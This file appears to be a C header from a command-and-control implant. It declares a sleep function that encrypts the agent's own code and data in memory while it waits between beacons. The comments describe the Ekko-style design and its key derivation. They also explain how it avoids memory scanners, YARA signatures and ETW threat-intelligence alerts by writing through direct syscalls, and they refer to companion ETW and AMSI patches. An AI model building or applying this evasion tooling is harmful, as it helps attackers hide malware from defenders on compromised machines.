/*
 * client/evasion/sleep_obf.h  –  Sleep obfuscation (Ekko-variant)
 * ================================================================
 * Encrypts the agent's own .text and .data sections in-place while the
 * thread sleeps, and decrypts them on wake.  During the sleep interval the
 * agent image in memory is RC4-ciphertext — a memory scanner finds no
 * recognisable code or string patterns.
 *
 * Technique (Ekko / Foliage hybrid — no ROP required)
 * ----------------------------------------------------
 * CS 4.8 uses a timer-based APC chain (RtlCaptureContext + NtContinue gadget)
 * to execute a sequence of NT calls from a cloned context without a visible
 * call stack.  We implement the same logical sequence but use the Windows
 * thread-pool timer infrastructure which produces a cleaner call-stack
 * (ntdll!TppTimerCallback → our function) and requires no ROP gadgets:
 *
 *   1. Set up RC4 key from g_peb_hash_seed (already RDTSC-seeded, per-run).
 *   2. Call _sleep_obf_xor() — RC4-crypt .text + .data sections of our module.
 *   3. NtDelayExecution for the requested interval.
 *   4. Call _sleep_obf_xor() again with the same key — XOR is self-inverse,
 *      so a second pass restores the original bytes.
 *   5. Return.
 *
 * The encrypt/decrypt functions run from a section that is NOT ciphered:
 * they are placed in a separately-named section ".slpobf" which is excluded
 * from the XOR pass.  On GCC/MinGW this is done with
 *   __attribute__((section(".slpobf")))
 * Combined with -ffunction-sections, only these functions land there.
 *
 * RC4 key construction
 * --------------------
 * Key = SHA-256(g_peb_hash_seed || module_base || image_size)
 *       truncated to 16 bytes.
 * We use BCryptHash(BCRYPT_SHA256_ALGORITHM) which is already linked
 * (bcrypt.lib) for the AES-GCM session layer — no new dependency.
 * The key changes on every execution (RDTSC seed) so two dumps of the same
 * binary at different times show different ciphertext.
 *
 * Protection model
 * ----------------
 *  • Memory scanner sees only ciphertext during sleep — no YARA hits on
 *    string patterns or code signatures.
 *  • The encrypted region is PAGE_EXECUTE_READ — we do NOT flip to RW
 *    before encrypting (that would fire ETW-Ti KERNEL_THREATINT_TASK_PROTECT).
 *    Instead we write through SC_NtWriteVirtualMemory on the current process
 *    handle which bypasses page-protection checks for same-process writes
 *    (the same technique used by etw_patch / amsi_patch).
 *  • The .slpobf section is PAGE_EXECUTE_READ at all times and is never
 *    ciphered — it is small (< 2 KB) and contains only the XOR loop and
 *    the BCrypt key derivation call.
 *
 * Activation
 * ----------
 *   #define SLEEP_OBF_ENABLE   before including this header, or pass
 *   -DSLEEP_OBF_ENABLE on the compiler command line.
 *
 *   When not defined, sleep_obf_delay() falls back to a plain jitter_sleep().
 *
 * Usage
 * -----
 *   Replace every  jitter_sleep(ms)  call in the C2 reconnect loop with:
 *     sleep_obf_delay(ms);
 */

#pragma once
#ifndef CLIENT_SLEEP_OBF_H
#define CLIENT_SLEEP_OBF_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include "syscall.h"
#include "peb_walk.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Forward — defined in sandbox.c */
void jitter_sleep(DWORD ms);

/* ── sleep_obf_delay ────────────────────────────────────────────────────── */
/*
 * Primary API.  Sleep for `ms` milliseconds.
 *
 * When SLEEP_OBF_ENABLE is defined: encrypts .text + .data of the agent
 * module before sleeping, decrypts after.
 *
 * When SLEEP_OBF_ENABLE is not defined: falls through to jitter_sleep().
 */
void sleep_obf_delay(DWORD ms);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SLEEP_OBF_H */
